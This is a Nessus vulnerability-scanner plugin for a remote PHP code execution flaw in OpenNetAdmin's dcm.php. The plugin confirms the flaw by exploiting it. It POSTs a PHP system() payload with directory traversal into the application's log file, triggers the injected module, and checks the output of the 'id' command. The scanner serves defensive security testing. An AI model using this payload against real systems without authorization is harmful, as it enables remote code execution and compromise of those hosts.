#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(69170);
  script_version("$Revision: 1.2 $");
  script_cvs_date("$Date: 2015/09/24 23:21:18 $");

  script_bugtraq_id(61004);
  script_osvdb_id(94927);
  script_xref(name:"EDB-ID", value:"26682");

  script_name(english:"OpenNetAdmin dcm.php options[desc] Parameter Arbitrary Remote PHP Code Execution");
  script_summary(english:"Attempts to execute arbitrary code");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server hosts a PHP script that is affected by a remote
PHP code execution vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The remote web server contains OpenNetAdmin, a system used for tracking
IP network attributes in a database.  The application utilizes a
web-based interface to administer data as well as a command line
interface. 

The version of OpenNetAdmin installed on the remote host is affected by
a remote PHP code execution vulnerability because the 'options[desc]'
parameter of the 'dcm.php' script fails to properly sanitize
user-supplied input.  A remote, unauthenticated attacker could leverage
this issue to execute arbitrary PHP code on a remote host by sending a
specially crafted POST request utilizing directory traversal sequences."
  );
  script_set_attribute(attribute:"solution", value:"Currently, there is no known solution to this issue.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2013/07/07");
  script_set_attribute(attribute:"plugin_publication_date", value:"2013/07/31");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"x-cpe:/a:opennetadmin:opennetadmin");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_DESTRUCTIVE_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2013-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");
include("url_func.inc");

port = get_http_port(default:80, php:TRUE);
appname = "OpenNetAdmin";

if (thorough_tests)
  dirs = list_uniq(make_list("/opennetadmin", "/ona", cgi_dirs()));
else
  dirs = make_list(cgi_dirs());

# Check for OpenNetAdmin
install_urls = make_list();
non_vuln = make_list();

foreach dir (dirs)
{
  res = http_send_recv3(
    method       : "GET",
    item         : dir + "/index.php",
    port         : port,
    exit_on_fail : TRUE
  );
  if (
    '<title>OpenNetAdmin' >< res[2] &&
    '<a title="Add DNS domain"' >< res[2] &&
    'onmouseover="ona_menu_closedown' >< res[2]
  )
  {
    install_urls = make_list(install_urls, dir);
  }
}

if (max_index(install_urls) == 0)
  audit(AUDIT_WEB_APP_NOT_INST, appname, port);

# Application is meant to run on Linux and according to
# http://opennetadmin.com/forum_archive/4/t-294.html it looks like it
# does not successfully run on Windows
cmd = "id";
upload_path = "pwd";
cmd_pat = "uid=[0-9]+.*gid=[0-9]+.*";

# Variables used in the foreach loop
script  = SCRIPT_NAME - ".nasl" + "-" + unixtime();
token = script + ".txt";
i = 0;

# Test our install(s)
foreach install (install_urls)
{
  exploited = FALSE;
  script = script + i;
  token = script + ".txt";

  report_url = build_url(qs:install, port:port);
  if (install == "")
  {
    report_url = ereg_replace(string:report_url, pattern:'/$', replace:"");
  }

  postdata = "options[desc]=<?php+system('echo `"+cmd+";"+upload_path+
               "`>"+token+"');?>&module=add_module&options[name]="+script+
               "&options[file]="+mult_str(str:"../", nb:12)+"var/log/ona.log";

  postdata = urlencode(
    str        : postdata,
    unreserved : "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234" +
                 "56789=+&_."
  );

  res2 = http_send_recv3(
    method : "POST",
    port   : port,
    item   : install + "/dcm.php",
    data   : postdata,
    add_headers : make_array(
       "Content-Type",
       "application/x-www-form-urlencoded"
    ),
    exit_on_fail : TRUE
  );
  exploit_upload = http_last_sent_request();

  if ("Module ADDED: " + script >< res2[2])
  {
    # Request our exploit script to run the PHP code
    res3 = http_send_recv3(
      method : "GET",
      port   : port,
      item   : install + "/dcm.php?module=" + script,
      exit_on_fail : TRUE
    );

    # Request our script to verify the code executed
    res4 = http_send_recv3(
      method : "GET",
      port   : port,
      item   : install + "/" + token,
      exit_on_fail : TRUE
    );
    if (egrep(pattern:cmd_pat, string:res4[2]))
    {
      exploited = TRUE;
      # Extract path for reporting
      get_path = strstr(res4[2], "/");
      get_up_path = chomp(get_path) + "/" + token;
      output = strstr(res4[2], "uid") - get_path;

      if (report_verbosity > 0)
      {
        snip = crap(data:"-", length:30)+' snip '+ crap(data:"-", length:30);
        report =
          '\nNessus was able to verify the issue exists with the following ' +
          'request :' +
          '\n' +
          '\n' + report_url + "/" + token +
          '\n' +
          '\nNote: This file has not been removed by Nessus and will need to'+
          '\nbe manually deleted (' +get_up_path+ ').'+
          '\n';
        if (report_verbosity > 1)
        {
          report +=
            '\nThis file was created using the following pair of requests :'+
            '\n' +
            '\n' + exploit_upload +
            '\n' + crap(data:"-", length:66) +
            '\n' + report_url + "/dcm.php?module=" + script +
            '\n' + crap(data:"-", length:66) +
            '\n' +
            '\nThe file created by Nessus executed the command "'+cmd+'"' +
            '\nwhich produced the following output :' +
            '\n' +
            '\n' + snip +
            '\n' + chomp(output) +
            '\n' + snip +
            '\n';
        }
        security_hole(port:port, extra:report);
      }
      else security_hole(port);
    }

  }
  if (!exploited) non_vuln = make_list(non_vuln, report_url);
  if (!thorough_tests) break;
  i++;
}

# Audits
installs = max_index(non_vuln);
if (installs > 0)
{
  if (installs == 1) audit(AUDIT_WEB_APP_NOT_AFFECTED, appname, non_vuln[0]);
  else exit(0, "The "+appname+" installs at " + join(non_vuln, sep:", ") +
    " are not affected."
  );
}
